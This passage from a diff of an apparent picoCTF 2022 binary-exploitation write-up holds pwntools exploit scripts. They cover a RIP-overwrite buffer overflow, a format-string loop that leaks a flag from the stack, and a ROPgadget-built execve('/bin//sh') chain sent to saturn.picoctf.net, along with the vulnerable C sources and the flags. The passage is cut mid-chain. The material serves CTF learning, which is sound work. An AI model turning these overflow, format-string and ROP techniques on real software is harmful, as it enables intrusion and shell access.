+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:  <span style="color:#75715e"># (&#39;server&#39;, &#39;port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># Run locally</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">init-pwndbg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will automatically get context arch, bits, os etc</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change logging level to help with debugging (error/warning/info/debug)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rip_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span> 
+</span></span><span style="display:flex;"><span>info(<span style="color:#e6db74">&#39;located RIP offset at </span><span style="color:#e6db74">{a}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(a<span style="color:#f92672">=</span>rip_offset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    rip_offset: p64(<span style="color:#ae81ff">0x40123b</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save payload to file</span>
+</span></span><span style="display:flex;"><span>write(<span style="color:#e6db74">&#39;payload&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start a new process</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PWN</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recv())
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Receive the flag</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/x-sixty-what.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{b1663r_15_b3773r_11c407bc}
 </code></pre><h2 id="flag-leak">flag leak</h2>
@@ -1090,77 +1090,77 @@ io.interactive()
 <p>Story telling class 1/2
 I&rsquo;m just copying and pasting with this program. What can go wrong?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;wchar.h&gt;
-#include &lt;locale.h&gt;
-
-#define BUFSIZE 64
-#define FLAGSIZE 64
-
-void readflag(char* buf, size_t len) {
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-
-  fgets(buf,len,f); // size bound read
-}
-
-void vuln(){
-   char flag[BUFSIZE];
-   char story[128];
-
-   readflag(flag, FLAGSIZE);
-
-   printf(&#34;Tell me a story and then I&#39;ll tell you one &gt;&gt; &#34;);
-   scanf(&#34;%127s&#34;, story);
-   printf(&#34;Here&#39;s a story - \n&#34;);
-   printf(story);
-   printf(&#34;\n&#34;);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-  // Set the gid to the effective gid
-  // this prevents /bin/sh from dropping the privileges
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-  vuln();
-  return 0;
-}
-</code></pre><p>From the source code we can see it will read the flag into flag variable. Besides, vulnerability is format string vulnerability by looking at this code:</p>
-<pre tabindex="0"><code>printf(story);
-</code></pre><p>Variables are store in stack, chances are we can leak the flag by utilizing this format string vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wchar.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;locale.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readflag</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buf, size_t len) {
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fgets(buf,len,f); <span style="color:#75715e">// size bound read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> flag[BUFSIZE];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> story[<span style="color:#ae81ff">128</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   readflag(flag, FLAGSIZE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;Tell me a story and then I&#39;ll tell you one &gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>   scanf(<span style="color:#e6db74">&#34;%127s&#34;</span>, story);
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;Here&#39;s a story - </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>   printf(story);
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Set the gid to the effective gid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code we can see it will read the flag into flag variable. Besides, vulnerability is format string vulnerability by looking at this code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(story);
+</span></span></code></pre></div><p>Variables are store in stack, chances are we can leak the flag by utilizing this format string vulnerability.</p>
 <p>I created a simply script to leaked the flag, not perfect but it will do its job:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-from pwn import *
-
-elf = context.binary = ELF(&#34;./vuln&#34;, checksec=False)
-context.log_level = &#34;error&#34;
-
-for x in range(130):
-  try:
-    p = remote(&#39;saturn.picoctf.net&#39;, 49713)
-    p.recvuntil(b&#34;&gt;&gt; &#34;)
-    p.sendline(&#39;%{}$s&#39;.format(x).encode())
-    p.recvline()
-    leaked = p.recvline()
-    if b&#34;CTF{&#34; in leaked:
-      print(&#34;Flag:&#34;, leaked)
-      break
-    else:
-      print(leaked)
-  except EOFError:
-    pass
-</code></pre><p><img src="/img/picoctf2022-binexp/flag_leak.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;error&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">130</span>):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;saturn.picoctf.net&#39;</span>, <span style="color:#ae81ff">49713</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">$s&#39;</span><span style="color:#f92672">.</span>format(x)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    leaked <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CTF{&#34;</span> <span style="color:#f92672">in</span> leaked:
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, leaked)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>      print(leaked)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/flag_leak.png" alt="IMG"></p>
 <p>We just need to add <code>&quot;pico&quot;</code> infront of the leaked flag.</p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
@@ -1168,86 +1168,86 @@ for x in range(130):
 <h3 id="description-9">Description</h3>
 <p>What&rsquo;s ROP? Can you exploit the following program to get the flag?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-
-#define BUFSIZE 16
-
-void vuln() {
-  char buf[16];
-  printf(&#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&#34;);
-  return gets(buf);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-
-  // Set the gid to the effective gid
-  // this prevents /bin/sh from dropping the privileges
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-  vuln();
-}
-</code></pre><p>The challenge clearly indicate we are dealing with ROP. I&rsquo;m not really familiar with it. However, a tool called <strong>ROPgadget</strong> can automate the ROP chain for us with the command below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 16
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> gets(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Set the gid to the effective gid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The challenge clearly indicate we are dealing with ROP. I&rsquo;m not really familiar with it. However, a tool called <strong>ROPgadget</strong> can automate the ROP chain for us with the command below:</p>
 <pre tabindex="0"><code>ROPgadget --binary vuln --ropchain
 </code></pre><p>With the ROP chain available, the rest is just simply assembling them:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python2
-# execve generated by ROPgadget
-from pwn import *
-from struct import pack
-context.log_level = &#39;error&#39;
-
-sh = remote(&#34;saturn.picoctf.net&#34;, 62560)
-
-# Padding goes here
-p = &#39;A&#39;*28
-
-p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5060) # @ .data
-p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
-p += pack(&#39;&lt;I&#39;, 0x080b074a) # pop eax ; ret
-p += &#39;/bin&#39;
-p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5064) # @ .data + 4
-p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
-p += pack(&#39;&lt;I&#39;, 0x080b074a) # pop eax ; ret
-p += &#39;//sh&#39;
-p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
-p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
-p += pack(&#39;&lt;I&#39;, 0x0804fb90) # xor eax, eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x08049022) # pop ebx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5060) # @ .data
-p += pack(&#39;&lt;I&#39;, 0x08049e39) # pop ecx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
-p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
-p += pack(&#39;&lt;I&#39;, 0x080e5060) # padding without overwrite ebx
-p += pack(&#39;&lt;I&#39;, 0x0804fb90) # xor eax, eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0804a3d2) # int 0x80
-
-sh.sendline(p)
-sh.interactive()
-</code></pre><p><img src="/img/picoctf2022-binexp/ropfu.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execve generated by ROPgadget</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;saturn.picoctf.net&#34;</span>, <span style="color:#ae81ff">62560</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding goes here</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080583c9</span>) <span style="color:#75715e"># pop edx ; pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5060</span>) <span style="color:#75715e"># @ .data</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x41414141</span>) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080b074a</span>) <span style="color:#75715e"># pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x08059102</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080583c9</span>) <span style="color:#75715e"># pop edx ; pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5064</span>) <span style="color:#75715e"># @ .data + 4</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x41414141</span>) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080b074a</span>) <span style="color:#75715e"># pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;//sh&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x08059102</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080583c9</span>) <span style="color:#75715e"># pop edx ; pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x41414141</span>) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0804fb90</span>) <span style="color:#75715e"># xor eax, eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x08059102</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x08049022</span>) <span style="color:#75715e"># pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5060</span>) <span style="color:#75715e"># @ .data</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x08049e39</span>) <span style="color:#75715e"># pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080583c9</span>) <span style="color:#75715e"># pop edx ; pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080e5060</span>) <span style="color:#75715e"># padding without overwrite ebx</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0804fb90</span>) <span style="color:#75715e"># xor eax, eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
